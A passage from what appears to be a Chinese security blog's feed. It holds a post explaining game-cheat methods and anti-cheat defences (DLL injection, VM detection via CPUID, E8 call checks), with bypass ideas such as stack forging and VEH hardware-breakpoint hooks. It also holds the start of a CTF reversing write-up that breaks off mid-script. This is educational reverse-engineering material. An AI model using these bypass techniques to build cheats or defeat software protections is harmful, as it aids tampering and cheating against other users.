href="#外挂原理" class="headerlink" title="外挂原理"></a>外挂原理</h2><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251006223212793.png" alt="image-20251006223212793"></p><p>外挂主要有两种方式，跨进程和注入式dll</p><p><strong>跨进程（External）</strong>：作弊程序驻外部进程，通过读取&#x2F;写入目标进程的内存、模拟输入、或监听渲染帧来实现功能；不把代码直接放入游戏进程。</p><p><strong>做法</strong></p><ul><li>外部进程使用系统API（例如 Windows 的 <code>ReadProcessMemory</code> &#x2F; <code>WriteProcessMemory</code>、<code>GetWindowRect</code>、<code>SendInput</code>、DirectX hook 外挂用的显存读取或重放）访问或影响目标。</li><li>通过画面采样、内存读取或图像识别（OCR&#x2F;模板匹配）来获得游戏状态。</li><li>模拟鼠标&#x2F;键盘输入或通过网络包修改（如果可能）来实现动作。</li></ul><p><strong>优点</strong></p><ul><li>不直接修改目标进程代码，风险较低（崩溃&#x2F;暴露面较小）。</li><li>实现门槛低（不用解决注入&#x2F;进程内同步复杂性）。</li><li>容易用普通权限运行（不需要内核权限）。</li></ul><p><strong>缺点</strong></p><ul><li>能力受限：不能直接调用内部函数或拦截渲染管线（功能受限，信息采集可能不完整）。</li><li>性能和精确度可能低（例如帧间延迟、画面识别误判）。</li><li>某些反作弊对跨进程访问检测严格（如检测异常的 OpenProcess&#x2F;ReadProcessMemory 调用、异常句柄等）。</li></ul><p><strong>检测点（反作弊）</strong></p><ul><li>监控外部进程对游戏的 OpenProcess&#x2F;ReadProcessMemory&#x2F;WriteProcessMemory&#x2F;WriteFile&#x2F;SetWindowsHookEx 等调用或异常句柄&#x2F;命名对象。</li><li>检测鼠标&#x2F;键盘输入的可疑模式（硬件生成 vs 软件注入差异）。</li><li>检测画面采样&#x2F;帧缓冲读取或重复的屏幕抓取行为。</li></ul><p><strong>注入式 DLL（Injected）</strong>：把一段 DLL 或代码注入到游戏进程地址空间中，代码直接运行在游戏上下文里，能直接调用游戏内部函数 &#x2F; 操作内存 &#x2F; 截获渲染与输入。</p><p><strong>做法（高层）</strong></p><ul><li>将自定义 DLL 注入到游戏进程（通过 CreateRemoteThread+LoadLibrary、SetWindowsHookEx、APC、manual mapping 等方式），在进程内加载后直接 hook 函数、patch 内存、截获 DirectX&#x2F;OpenGL&#x2F;Vulkan 调用或直接修改游戏状态（内存&#x2F;对象指针）。</li><li>也可能用 inline hook、vtable hook、IAT hook、inline patch、函数 trampolines 等技术直接替换&#x2F;拦截函数。</li></ul><p><strong>优点</strong></p><ul><li>功能强大：可以直接操作游戏对象、调用内核函数、拦截渲染&#x2F;网络栈，精确度高、延迟低。</li><li>可以实现隐蔽的“内部”逻辑（例如修改游戏状态而不触发外部可见的访问）。</li></ul><p><strong>缺点</strong></p><ul><li>风险更高：进程崩溃、符号暴露、注入行为容易被检测到（例如扫描已加载模块、异常页属性、线程注入痕迹）。</li><li>反作弊防护（内核防护、签名白名单、完整性校验）会重点拦截注入行为。</li><li>注入技术和绕过反作弊往往触及安全&#x2F;法律灰区。</li></ul><p><strong>检测点（反作弊）</strong></p><ul><li>检查进程模块列表（不应出现未知模块），校验模块签名&#x2F;完整性（代码签名或哈希）。</li><li>监控进程创建线程&#x2F;远程加载库等操作的来源。</li><li>使用内核级驱动（或防护内核模式签名）来检测和阻断注入（例如禁止未签名驱动、阻断 CreateRemoteThread 目标进程等）。</li></ul><p>其他常见变体（补充）</p><ul><li><strong>内核级外挂（Kernel-mode &#x2F; Driver cheats）</strong>：通过安装驱动绕过用户态检查（可读写任意进程内存、隐藏进程、hook 内核函数）。能力极强但需要签名&#x2F;权限，且更容易被检测&#x2F;追责。</li><li><strong>网络层作弊（Packet manipulation &#x2F; MITM）</strong>：拦截&#x2F;修改网络数据包（可能在客户端和服务器间伪造状态）。</li><li><strong>模拟器&#x2F;客户端修改</strong>：在模拟器或改造的客户端上直接修改逻辑（例如改协议、修改资源文件）。</li><li><strong>外部硬件或辅助设备</strong>：硬件宏、专用操控器、FPGA 等在硬件层面模拟或加速作弊动作。</li></ul><p>待补充…</p><h2 id="Ring3常见反作弊手段"><a href="#Ring3常见反作弊手段" class="headerlink" title="Ring3常见反作弊手段"></a>Ring3常见反作弊手段</h2><p>“<strong>Ring3</strong>” 是操作系统底层架构中的一个非常重要的概念，尤其是在安全、逆向、驱动开发中经常出现。要理解它，先要从 CPU 的 <strong>特权级（Privilege Level）</strong> 机制讲起。</p><table><thead><tr><th>名称</th><th>特权级别</th><th>说明</th></tr></thead><tbody><tr><td><strong>Ring0</strong></td><td>最高权限</td><td>操作系统内核（Kernel Mode）</td></tr><tr><td><strong>Ring1</strong></td><td>较高权限</td><td>旧架构中用于驱动（现代系统很少用）</td></tr><tr><td><strong>Ring2</strong></td><td>较低中间层</td><td>保留或未使用</td></tr><tr><td><strong>Ring3</strong></td><td>最低权限</td><td>用户程序运行环境（User Mode）</td></tr></tbody></table><p>大多数现代操作系统（如 Windows、Linux）只实际使用：</p><ul><li><strong>Ring0：内核态</strong></li><li><strong>Ring3：用户态</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌───────────────┐</span><br><span class="line">│  Ring0         │ ← 内核态（最高权限）</span><br><span class="line">│  操作系统内核   │</span><br><span class="line">│  驱动程序       │</span><br><span class="line">├───────────────┤</span><br><span class="line">│  Ring3         │ ← 用户态（最低权限）</span><br><span class="line">│  应用程序       │</span><br><span class="line">│  游戏 / 浏览器  │</span><br><span class="line">└───────────────┘</span><br></pre></td></tr></table></figure><p>详见<a href="https://matriy330.github.io/32958ffb/">逆向常见反调试总结 | Matriy’s blog</a></p><p><strong>VT</strong> 全称是 **Intel VT-x (Virtualization Technology)**，AMD 的对应技术叫 <strong>AMD-V</strong>。</p><p>它是 <strong>硬件级虚拟化支持</strong>，允许一个物理 CPU 通过硬件机制运行多个“虚拟机” (Virtual Machine)。</p><blockquote><p>简单说：VT 就是让虚拟机（如 VMware、VirtualBox、Hyper-V）能高效运行的“硬件加速层”。</p></blockquote><p>许多分析人员、CTF 环境、恶意代码研究者，都在虚拟机里运行样本（方便快照和隔离）。</p><p>于是，<strong>恶意程序会想办法检测自己是不是运行在虚拟机环境中</strong>。这类技术叫做 **反虚拟化 (Anti-VM)**，也经常和反调试配合使用。</p><p>当 VT开启时，CPU 允许进入一种叫 <strong>VMX root &#x2F; non-root mode</strong> 的模式：</p><ul><li><strong>Root mode</strong>：运行 VMM（虚拟机管理器，例如 VMware &#x2F; Hyper-V）</li><li><strong>Non-root mode</strong>：运行虚拟机里的客体系统（guest OS）</li></ul><p>当虚拟机里执行某些敏感指令（如 CPUID、SIDT、SGDT、IN、OUT 等）时，CPU 会把控制权交还给 VMM —— 这就是所谓的 <strong>VM exit</strong>。</p><p>在硬件虚拟化（Intel VT-x 或 AMD-V）体系中，CPU 和 内存 被划分为三个逻辑层：</p><table><thead><tr><th>层级</th><th>名称</th><th>运行内容</th><th>特征</th></tr></thead><tbody><tr><td><strong>Host（宿主机）</strong></td><td>宿主操作系统 &#x2F; Hypervisor</td><td>真实运行在物理硬件上</td><td>拥有最高控制权</td></tr><tr><td><strong>Guest（客户机）</strong></td><td>被虚拟化出来的“虚拟电脑”</td><td>运行自己的 OS（例如虚拟机中的 Windows 或 Linux）</td><td>受 Hypervisor 控制</td></tr><tr><td><strong>Hardware（物理层）</strong></td><td>CPU、内存、I&#x2F;O 设备</td><td>由 VT 机制分时提供给各 Guest</td><td>提供虚拟化支持指令（VMX &#x2F; SVM）</td></tr></tbody></table><table><thead><tr><th>状态</th><th>描述</th></tr></thead><tbody><tr><td><strong>VM-entry</strong></td><td>CPU 从 Hypervisor 进入 Guest 开始执行 → Guest 代码运行在 VMX non-root mode。</td></tr><tr><td><strong>VM-exit</strong></td><td>当 Guest 执行敏感指令（如 IO、CPUID、HLT、VMCALL 等）或发生异常时，CPU 自动退出 Guest 模式，把控制权交回 Hypervisor （Host）。</td></tr><tr><td><strong>Hypervisor 处理事件</strong></td><td>Hypervisor 检查发生了什么（例如 Guest 访问了被禁止的寄存器），修改状态或模拟结果。</td></tr><tr><td><strong>再次 VM-entry</strong></td><td>Hypervisor 处理完毕后再让 CPU 返回 Guest 继续执行。</td></tr></tbody></table><table><thead><tr><th>术语</th><th>含义</th><th>所在层级</th></tr></thead><tbody><tr><td><strong>Host</strong></td><td>物理机 + 宿主操作系统</td><td>真实硬件</td></tr><tr><td><strong>Hypervisor (VMM)</strong></td><td>虚拟机监控器，调度 Guest 运行</td><td>VMX root mode</td></tr><tr><td><strong>Guest</strong></td><td>被虚拟化出来的操作系统或程序</td><td>VMX non-root mode</td></tr></tbody></table><p>如</p><table><thead><tr><th>角色</th><th>谁在做</th></tr></thead><tbody><tr><td><strong>Host（宿主）</strong></td><td>你的物理机系统，比如 Windows 11 或 Linux + VMware Workstation</td></tr><tr><td><strong>Hypervisor（虚拟机管理器）</strong></td><td>VMware 内核驱动或 Hyper-V 核心</td></tr><tr><td><strong>Guest（客户机）</strong></td><td>VMware 中的 Windows 10；它的 kernel 在 CPU 的 VMX non-root mode 运行</td></tr></tbody></table><p><strong>单步异常在 VT 下导致 RIP 指向错误（RIP 指向超前）</strong></p><p>在裸机上，CPU 单步（trap on single-step &#x2F; TF 标志）会在每条指令后产生 <code>#DB</code>（debug exception），由调试器&#x2F;操作系统处理；处理完通常把 <code>RIP</code> 指向下一条要执行的指令（或按调试器修改的上下文继续）。</p><p>在硬件虚拟化（VT-x&#x2F;AMD-V）场景下，guest 的某些异常或控制事件需要由 hypervisor 处理：这会产生 <strong>VM-exit</strong>（把执行从 guest 切回到 hypervisor&#x2F;host），hypervisor 处理完后再 VM-entry 回到 guest。</p><p>如果 hypervisor（或虚拟化实现）在处理 VM-exit&#x2F;VM-entry 时的上下文恢复&#x2F;单步逻辑有 bug（比如没有正确更新或保存 guest 的 TF、RIP、或没有把单步后的指令指针正确设置），那么当异常&#x2F;单步完成后，guest 的 <code>RIP</code> 可能不会精确指向“应该执行的下一条指令”，而是“超前”到更后面的指令，从而跳过某些指令（例如 <code>nop</code> 后面的指令被执行，或相反）。</p><p><strong>为什么会发生</strong></p><ul><li>VM-exit&#x2F;entry 路径要保存&#x2F;恢复大量 CPU 状态（RIP、RFLAGS、寄存器、MSR 等）。实现复杂、边界条件多。某些 hypervisor&#x2F;虚拟化产品在处理单步（TF）或调试中断时逻辑不完善或优化错误，就会把 RIP 恢复错位。</li><li>有时 hypervisor 为了“优化”对单步的支持，会通过硬件单步模拟、软件插桩或修改跳转逻辑来避免大量 VM-exit，但这样更容易出错。</li></ul><p>典型现象</p><blockquote><p>在真实情况下，单步后 RIP 应该指向 <code>nop</code> 指令（或下一条指令）；但在有些 VT 实现中，单步返回后 RIP 指向 <code>nop</code> 之后的下一条有效指令（也就是跳过了 <code>nop</code> 的执行点或多执行了一条），造成控制流不一致。</p></blockquote><p><strong>EPThook（EPT Hook）检测与时间侧信道</strong></p><p>EPT 简单回顾</p><ul><li>EPT（Intel 的 Extended Page Table）是 hypervisor 用来把 Guest-physical 映射到 Host-physical 的硬件页表（第二层页表）。Hypervisor 可以通过修改 EPT 条目控制某个 guest 页面是否可读&#x2F;可写&#x2F;可执行，并在访问被禁止时触发 EPT violation → VM-exit。</li><li>基于 EPT 的 hook（EPThook）通常做法：把目标页的 EPT 条目去掉 execute 权或读写权限。Guest 一旦尝试<strong>执行</strong>该页面或<strong>读写</strong>该页面，就会触发 EPT-violation（VM-exit），由 hypervisor 在 host 端处理（记录、修改、跳转等），然后再返回 guest。</li></ul><p>一些VT会开启EPTHook，要检测EPTHook，和检测VT状态的思路一致。当一个页面被EPTHook了，执行所需的时间远比读取页面的时间要长。因为读取页面不需要频繁的换入换出页面，而先读写后执行则会在在执行和读取页面之间交替换入换出，从而浪费大量时间。</p><p><strong>cpu_id检测</strong></p><p><code>CPUID</code> 是一条 <strong>x86 架构的处理器指令</strong>  用于<strong>查询 CPU 的信息</strong>（厂商、型号、功能支持、虚拟化状态、缓存大小、是否有超线程等）。</p><blockquote><p>很多虚拟化平台（VMware、VirtualBox、Hyper-V、QEMU）以及沙箱环境都会在 <code>CPUID</code> 的返回值中留下特征。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 1</span><br><span class="line">cpuid</span><br></pre></td></tr></table></figure><table><thead><tr><th>ECX bit31</th><th>状态</th></tr></thead><tbody><tr><td>0</td><td>物理机（bare-metal）</td></tr><tr><td>1</td><td>虚拟化环境（VMware&#x2F;VirtualBox&#x2F;Hyper-V 等）</td></tr></tbody></table><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007200842968.png" alt="image-20251007200842968"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> cpu_info[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ① 调用 CPUID(EAX=1) 获取基本 CPU 功能信息</span></span><br><span class="line">__cpuid(cpu_info, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ② 检查 ECX[31] (bit 31)：Hypervisor bit</span></span><br><span class="line"><span class="keyword">if</span> ( (cpu_info[<span class="number">2</span>] &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span> ) &#123;           <span class="comment">// 存在 Hypervisor</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清零寄存器（可选）</span></span><br><span class="line">    cpu_info[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    cpu_info[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    cpu_info[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ③ 调用 CPUID(EAX=0x40000000) 获取 hypervisor vendor ID</span></span><br><span class="line">    __cpuid(cpu_info, <span class="number">0x40000000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断 EBX, ECX, EDX 是否为 &quot;Microsoft Hv&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (cpu_info[<span class="number">1</span>] == <span class="number">0x7263694d</span> &amp;&amp;  <span class="comment">// &quot;Micr&quot;</span></span><br><span class="line">        cpu_info[<span class="number">2</span>] == <span class="number">0x666f736f</span> &amp;&amp;  <span class="comment">// &quot;osoft&quot;</span></span><br><span class="line">        cpu_info[<span class="number">3</span>] == <span class="number">0x76482074</span>) &#123;  <span class="comment">// &quot; Hv&quot; + &quot;t&quot;（Microsoft Hv）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再调用 CPUID(EAX=0x40000003) 获取 Hyper-V 特定功能信息</span></span><br><span class="line">        __cpuid(cpu_info, <span class="number">0x40000003</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ④ 检查 EBX bit0：root partition flag</span></span><br><span class="line">        <span class="keyword">if</span> (cpu_info[<span class="number">1</span>] &amp; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;   <span class="comment">// 在 Hyper-V 的 root 分区（宿主层）</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;    <span class="comment">// 在 Hyper-V 的子分区（虚拟机中）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;   <span class="comment">// 没检测到 Hyper-V</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>E8 检查（E8 Check）</strong> 是一种经典的 <strong>反外挂 &#x2F; 反破解 &#x2F; 调用完整性检查机制</strong>，它的名字来源于 x86 指令集中 <code>CALL</code> 指令的机器码 **<code>0xE8</code>**。</p><p>节 <code>E8</code> 表示一条相对调用（<code>CALL rel32</code>），后面跟 4 字节相对偏移。</p><p>当 CPU 执行 <code>CALL</code> 时，会做两件事：</p><ol><li><strong>把下一条指令的地址压入栈（即返回地址）</strong>；</li><li><strong>跳转到目标函数</strong>。</li></ol><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00401000: E8 1B 00 00 00    call 00401020</span><br><span class="line">00401005: 90                nop</span><br><span class="line">00401006: ...</span><br></pre></td></tr></table></figure><p>当执行 <code>call 00401020</code> 时，CPU 会：</p><ul><li>压栈返回地址：<code>00401005</code>；</li><li>跳转到 <code>00401020</code>。</li></ul><p><strong>E8 检查 &#x3D; 检查调用栈中返回地址的前一条指令是否真的是 CALL（E8 开头）。</strong></p><p>例如游戏里某个敏感函数 <code>GetKey()</code>，只允许被合法逻辑调用。</p><p>外挂可能想绕过逻辑直接“跳过去”调用，于是手工修改栈或直接 JMP 到 <code>GetKey</code>，不走真正的 <code>CALL</code>。</p><p>程序为了防御这种“伪造调用”，就在函数开头做检查：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GetKey:</span><br><span class="line">    mov eax, [esp]          ; 取返回地址</span><br><span class="line">    dec eax                 ; 返回地址 - 1 （指向 CALL 的 E8 字节）</span><br><span class="line">    cmp byte ptr [eax], 0xE8 ; 检查是不是 E8 CALL</span><br><span class="line">    jne  IllegalCallDetected</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><blockquote><p>如果返回地址前一字节确实是 0xE8 → 说明这个函数是通过 <code>CALL</code> 指令正常被调用的。</p><p>如果不是 → 说明是外挂或异常跳转 → 触发异常 &#x2F; 拒绝执行。</p></blockquote><p><strong>按机器特征分发可执行文件 + GetKey</strong></p><blockquote><p>“返回地址检查由客户端分发游戏文件，根据机器某些软硬件特征分发不同的可执行文件，让 <code>GetKey</code> 函数对不同用户不同，外挂不得不调用该函数来获取解密密钥。”</p></blockquote><p>解释：</p><ul><li>服务端根据机器指纹（例如 CPU id、硬盘序列号、MAC、TPM 等）为每台机器生成<strong>不同的可执行文件</strong>或不同的 key&#x2F;逻辑。</li><li>游戏里有一个 <code>GetKey()</code>（或类似）函数负责根据本机特征生成&#x2F;返回解密密钥或解密流程的关键信息。</li><li>这样，外挂如果要解密&#x2F;获得游戏内部关键数据，就必须<strong>在进程内</strong>以正确方式调用 <code>GetKey()</code>（或模拟其逻辑）。外部简单修改同一文件在别的机器上不一定生效，从而提高逆向门槛。</li></ul><p>用途：这是“按机打包 + 绑定密钥”的反破解手段——增加每台机器的差异，降低通用补丁&#x2F;外挂的可用性。</p><p><strong>之前的绕过思路（在没有 E8 检查时）</strong></p><blockquote><p>“在没有 E8 检查之前，可以找到主模块内某一个 <code>ret</code> 指令的地址，将当前位置压栈、压入 <code>ret</code> 指令地址、jmp到目标函数。”</p></blockquote><p>解释（高层）：</p><ul><li>攻击者在游戏的主模块里找一个合适的 <code>ret</code> 指令地址（或者任意可返回的地址），构造栈上返回地址，然后直接 <code>jmp</code> 到目标函数（比如 <code>GetKey</code>）去调用它。</li><li>手法本质上是<strong>伪造调用栈：把“返回地址”放到栈上并跳转</strong>，让目标函数执行完后以伪造的返回地址回到某处，从而避开正常调用约束或上下文检查。</li><li>这种方法通常用于“进程内调用”但不走正常调用路径（绕过某些前置检查、非法构造调用上下文）。</li></ul><p>这是在没有更严格检测时一种常见的内存&#x2F;控制流操纵技巧。</p><p><strong>加入 E8 检查后老方法作废</strong></p><p>“对抗：用 Zyais 框架动态分析指令，去除返回地址检查，修补变量地址后调用。” —— 高层含义</p><ul><li>这句话意思不是说具体如何去做绕过，而是在描述一种高级逆向&#x2F;动态分析思路的<strong>概念性流程</strong>：<ol><li>用动态二进制分析&#x2F;执行框架（提到的 “Zyais”——理解为某种动态分析或动态二进制翻译&#x2F;插桩工具）对程序运行时的二进制指令进行<strong>动态跟踪&#x2F;修改</strong>。</li><li>找到并识别出“返回地址检查”的那段代码（即验证 <code>E8</code> 的检测逻辑）。</li><li>在运行时把这段检查<strong>绕过或修改</strong>（去除&#x2F;补丁），或者直接在内存中修补相关变量&#x2F;校验数据，使检查通过。</li><li>修补完检测&#x2F;上下文后，再安全地调用目标函数（例如 <code>GetKey</code>）。</li></ol></li><li>换句话说：利用动态分析与内存&#x2F;指令级修补，在运行时<strong>消除或中和</strong>防护逻辑，从而恢复对目标函数的可控调用。</li></ul><p>防止hook:</p><p><strong>CRC32检查和其他定时对.text段进行CRC32完整性检查，</strong></p><p><strong>对抗</strong>:硬件断点VEH HOOK</p><p>攻击者不会直接在目标函数序列上打软件补丁（修改 <code>.text</code>），而是通过<strong>硬件断点（CPU Debug Registers）</strong>或注册 <strong>VEH（Vectored Exception Handler）</strong> 来拦截执行流并在运行时修改寄存器&#x2F;内存或模拟函数结果。</p><p>这样做好处是：<code>.text</code> 没有永久被改写（CRC 在内存视图上仍然是原始），检查 <code>.text</code> 的哈希会通过；但是实际运行时可以在断点触发处动态改变行为（比如在函数入口前拦截并直接返回）。</p><p><strong>对抗</strong>:NtQuerySystemInformation查询添加的VEH</p><p>有人会尝试用系统查询接口来“发现”某些异常处理器或调试对象（比如枚举句柄&#x2F;系统句柄表来发现调试器&#x2F;VEH 的痕迹），而攻击者会 hook&#x2F;伪造这些系统调用来隐藏自己。</p><p><strong>对抗</strong>:下硬件断点，HookKiUserExceptionHandler不经过异常分派直接处理异常</p><p>内核或 NTDLL 里有一条把异常分派给用户态的“桥”&#x2F;入口（例如 <code>KiUserExceptionDispatcher</code> &#x2F; <code>RtlDispatchException</code> 等在异常分派链上关键函数）。</p><p>攻击者可以 hook 或替换该路径（例如替换 <code>KiUserExceptionDispatcher</code> 指向的地址或在内核安装 hook），使得当异常发生时 <strong>不经过正常的异常分派链</strong>（VEH&#x2F;SEH）而被攻击者的代码直接处理，从而绕过被用于检测的 handler。</p><p>另一种是直接在内核 &#x2F; ntdll 层挂钩并自己处理异常，或把异常转交给调试器，令目标程序的检测逻辑根本看不到异常发生（或在异常到达检测点前被“吞掉”）。</p><p><strong>对抗</strong>:添加自己的异常处理器，主动用INT3触发异常，检测分派到自己的异常处理后的寄存器，并进行栈回溯</p><ul><li>防护代码在进程内部注册自己的 VEH&#x2F;SEH，并主动触发一个受控异常（例如 <code>INT3</code> 或 <code>RaiseException</code>）。该异常在正常情况下会先到达系统&#x2F;调试层，再进到进程的 VEH&#x2F;SEH。</li><li><strong>检测点</strong>：在自家的 handler 中，防护逻辑会检查：<ul><li><strong>寄存器上下文</strong>（例如 RIP&#x2F;EIP、RSP&#x2F;ESP、寄存器值）是否和触发点一致（或是否被篡改）；</li><li><strong>栈回溯（call stack&#x2F;backtrace）</strong>，验证异常来源是预期的调用序列（比如返回地址点位于本模块 <code>.text</code> 的合法位置，并且调用者不是第三方模块）；</li><li><strong>返回地址&#x2F;调用序列的完整性</strong>（比如前面你提过的 E8 检查，或更强的 call-stack hash）。</li></ul></li></ul><p>如果这些检查发现异常在到达 handler 前被拦截、修改或被不合法的上下文处理（例如寄存器被替换，返回地址不合法），就可以判定存在 hook&#x2F;中间人（例如 VEH 被拦截，或 KiUserExceptionDispatcher 被 Hook）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;游戏逆向初探&quot;&gt;&lt;a href=&quot;#游戏逆向初探&quot; class=&quot;headerlink&quot; title=&quot;游戏逆向初探&quot;&gt;&lt;/a&gt;游戏逆向初探&lt;/h1&gt;&lt;p&gt;参考视频：&lt;a href=&quot;https://xz.aliyun.com/course-view?id=36&quot;</summary>
      
    
    
    
    <category term="Re" scheme="http://matriy330.github.io/categories/Re/"/>
    
    
    <category term="Re" scheme="http://matriy330.github.io/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2023 10 wp</title>
    <link href="http://matriy330.github.io/2ade85f8/"/>
    <id>http://matriy330.github.io/2ade85f8/</id>
    <published>2025-10-02T16:00:00.000Z</published>
    <updated>2025-10-03T13:19:19.242Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF-2023-10-wp"><a href="#DASCTF-2023-10-wp" class="headerlink" title="DASCTF 2023 10 wp"></a>DASCTF 2023 10 wp</h1><h2 id="auuuu3"><a href="#auuuu3" class="headerlink" title="auuuu3"></a>auuuu3</h2><p>通过解析autoit动态脚本语言执行命令，先安装这个工具</p><p><a href="https://github.com/nazywam/AutoIt-Ripper"><code>https://github.com/nazywam/AutoIt-Ripper</code></a></p><p>在Scripts文件夹中找到<code>autoit-ripper.exe</code>程序，按照语法输入得到script.au3文件</p><p>得到的au3文件分析加密的流程:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Func ENC ( $DATA , $KEY )</span><br><span class="line">$DATA = Binary ( $DATA )</span><br><span class="line">Local $DATALEN = BinaryLen ( $DATA )</span><br><span class="line">If $DATALEN = 0 Then</span><br><span class="line">Return &quot;&quot;</span><br><span class="line">ElseIf $DATALEN &lt; 8 Then</span><br><span class="line">$DATALEN = 8</span><br><span class="line">EndIf</span><br><span class="line">Local $OPCODE = &quot;0xquot;</span><br><span class="line">Local $CODEBUFFER = DllStructCreate ( &quot;byte[&quot; &amp; BinaryLen ( $OPCODE ) &amp; &quot;]&quot; )</span><br><span class="line">DllStructSetData ( $CODEBUFFER , 1 , $OPCODE )</span><br><span class="line">Local $V = DllStructCreate ( &quot;byte[&quot; &amp; Ceiling ( $DATALEN / 4 ) * 4 &amp; &quot;]&quot; )</span><br><span class="line">DllStructSetData ( $V , 1 , $DATA )</span><br><span class="line">Local $K = DllStructCreate ( &quot;byte[16]&quot; )</span><br><span class="line">DllStructSetData ( $K , 1 , $KEY )</span><br><span class="line">DllCall ( &quot;user32.dll&quot; , &quot;none&quot; , &quot;CallWindowProc&quot; , &quot;ptr&quot; , DllStructGetPtr ( $CODEBUFFER ) , &quot;ptr&quot; , DllStructGetPtr ( $V ) , &quot;int&quot; , Ceiling ( $DATALEN / 4 ) , &quot;ptr&quot; , DllStructGetPtr ( $K ) , &quot;int&quot; , 0 )</span><br><span class="line">Local $RET = DllStructGetData ( $V , 1 )</span><br><span class="line">$CODEBUFFER = 0</span><br><span class="line">$V = 0</span><br><span class="line">$K = 0</span><br><span class="line">Return $RET</span><br><span class="line">EndFunc</span><br><span class="line">##输入字符的加密函数ENC 函数动态加载user32.dll函数，从中调用加密函数加密</span><br><span class="line">$FORM1 = GUICreate ( &quot;auuuu3&quot; , 378 , 185 , 254 , 182 )</span><br><span class="line">GUICtrlSetFont ( + 4294967295 , 14 , 400 , 0 , &quot;MS Sans Serif&quot; )</span><br><span class="line">$SERIAL = GUICtrlCreateInput ( &quot;&quot; , 56 , 48 , 257 , 21 )</span><br><span class="line">$CHECK = GUICtrlCreateButton ( &quot;Check&quot; , 56 , 80 , 257 , 33 )</span><br><span class="line">GUISetState ( @SW_SHOW )</span><br><span class="line">While 1</span><br><span class="line">$NMSG = GUIGetMsg ( )</span><br><span class="line">Switch $NMSG</span><br><span class="line">Case $GUI_EVENT_CLOSE</span><br><span class="line">Exit</span><br><span class="line">Case $CHECK</span><br><span class="line">Dim $CIPHERTEXT = &quot;0x7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675&quot;</span><br><span class="line">$KEY = &quot;Wowww111auUu3&quot;</span><br><span class="line">$STR = GUICtrlRead ( $SERIAL )</span><br><span class="line">If StringLen ( $STR ) &lt;&gt; 38 Then</span><br><span class="line">MsgBox ( &quot;&quot; , &quot;&quot; , &quot;wrong&quot; )</span><br><span class="line">ContinueCase</span><br><span class="line">EndIf</span><br><span 